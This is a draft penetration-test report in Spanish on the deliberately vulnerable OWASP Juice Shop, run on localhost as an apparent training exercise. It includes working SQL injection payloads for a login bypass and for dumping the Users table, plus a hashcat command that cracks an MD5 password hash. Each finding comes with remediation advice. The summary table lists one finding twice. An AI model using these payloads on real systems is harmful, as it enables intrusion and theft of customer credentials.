# Informe Técnico — Test de Intrusión Web "Tienda Online" (Auditoría #2)

| | |
|---|---|
| **Cliente / Alcance** | Empresa de e-commerce (ficticia) — tienda online |
| **Sistema real** | OWASP Juice Shop (app web vulnerable, laboratorio) · `http://localhost:3000` |
| **Tipo de prueba** | Caja negra, aplicación web |
| **Metodología** | OWASP WSTG |
| **Autor** | [Tu nombre] |
| **Fecha** | 2026-11-26 · Versión 0.1 (borrador) |

> ⚠️ Laboratorio local, app vulnerable a propósito, fines educativos. Escenario: investigar un robo de datos de clientes a través de la web comercial.

## 1. Alcance y objetivos
- **Objetivo:** identificar las vulnerabilidades de la tienda que permitirían (o permitieron) el **robo de datos de clientes**.
- **En alcance:** la aplicación web `http://localhost:3000` y su API (`/rest/`, `/api/`).
- **Fuera de alcance:** DoS, infraestructura del host.

## 2. Metodología y herramientas (Fase 2-3)
| Fase | Herramientas |
|---|---|
| Reconocimiento | navegador + DevTools, `whatweb` |
| Mapeo / proxy | Burp Suite (interceptar la API) |
| Escaneo web | `nikto`, `nmap -p3000` |
| Explotación | manual, `sqlmap` |
| Credenciales | `john` / `hashcat` (crackear hashes robados) |

**Reconocimiento:**
```
whatweb http://localhost:3000
```
```
[PEGAR SALIDA]
```

## 3. Resumen de hallazgos
| ID | Hallazgo | Severidad | CVSS |
|---|---|:---:|:---:|
| F-01 | SQLi en el login → acceso como administrador | 🔴 Crítica | 9.8 |
| F-02 | SQLi en el buscador → robo de datos de clientes | 🔴 Crítica | 9.8 |
| F-03 | Contraseñas en MD5 sin sal (crackeables) | 🟠 Alta | 7.5 |
| F-02 | SQLi en el buscador → robo de datos de clientes | 🔴 Crítica | 9.8 |

## 4. Hallazgos detallados

### F-01 · Inyección SQL en el login (acceso como administrador) — 🔴 Crítica

| Campo | Valor |
|---|---|
| **CVSS 3.1** | 9.8 — bypass de autenticación |
| **Componente** | Formulario de login (`POST /rest/user/login`) |
| **OWASP** | A03:2021 – Injection · CWE-89 |

**Descripción.** El campo de email del login se concatena en la consulta SQL sin sanear. Inyectando una condición siempre verdadera se **omite la autenticación** y se accede como el primer usuario (administrador).

**Pasos de reproducción (PoC):**
```
En el campo Email:  ' OR 1=1--
En Password:        cualquier cosa
-> Inicia sesión como administrador (admin@juice-sh.op)
```
![Evidencia F-01: sesión iniciada como admin](EVIDENCIA_f01_admin.png)

**Impacto.** Acceso total a la cuenta de administrador sin credenciales: gestión de la tienda, pedidos y datos.

**Remediación.** Consultas parametrizadas en la autenticación; nunca concatenar la entrada. Bloqueo de intentos y 2FA.

### F-02 · Inyección SQL en el buscador → robo de datos de clientes — 🔴 Crítica

| Campo | Valor |
|---|---|
| **CVSS 3.1** | 9.8 — exfiltración de datos |
| **Componente** | API de búsqueda (`GET /rest/products/search?q=`) |
| **OWASP** | A03:2021 – Injection · CWE-89 |

**Descripción.** El parámetro `q` del buscador se concatena dentro de una consulta con paréntesis anidados. Cerrando el contexto (`'))`) e inyectando un `UNION SELECT` con el número correcto de columnas (**10**), se recupera el contenido de la tabla **Users** (todos los clientes).

**Pasos de reproducción (PoC):**
```
# 1) Confirmar inyección (devuelve success, sin error):
/rest/products/search?q=test'))--

# 2) Averiguar nº de columnas (el error "...same number of result columns" guía):
#    -> 10 columnas en esta versión.

# 3) Volcar la tabla de clientes:
/rest/products/search?q=qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9','10' FROM Users--
```
Resultado: email en el campo `name` y hash de contraseña en `description` de cada cliente.

![Evidencia F-02: JSON con emails y hashes de todos los usuarios](EVIDENCIA_f02_dump.png)

**Impacto.** **Brecha de datos personales** (RGPD): exposición de los correos y credenciales (hasheadas) de todos los clientes. Es el origen del robo de datos investigado.

**Remediación.** Consultas parametrizadas; validación de entrada; mínimos privilegios en la BD; no exponer errores SQL.

### F-03 · Contraseñas almacenadas con MD5 sin sal — 🟠 Alta

| Campo | Valor |
|---|---|
| **CVSS 3.1** | 7.5 |
| **Componente** | Almacenamiento de contraseñas (tabla Users) |
| **OWASP** | A02:2021 – Cryptographic Failures · CWE-916 |

**Descripción.** Las contraseñas se guardan como **MD5 sin sal** (hash de 32 hex). MD5 es rápido y sin sal, por lo que los hashes robados en F-02 se **crackean** trivialmente con diccionario/rainbow tables.

**Pasos de reproducción (PoC):**
```
echo "0192023a7bbd73250516f069df18b500" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# -> admin@juice-sh.op : admin123
```

**Impacto.** Convierte la fuga de hashes (F-02) en **robo efectivo de credenciales** en texto claro → acceso a las cuentas reales de los clientes.

**Remediación.** Usar **bcrypt/argon2** con sal por usuario; nunca MD5/SHA1 para contraseñas.

## 5. Conclusiones
[Al final.]

---
<sub>Confidencial. Laboratorio autorizado, fines educativos.</sub>
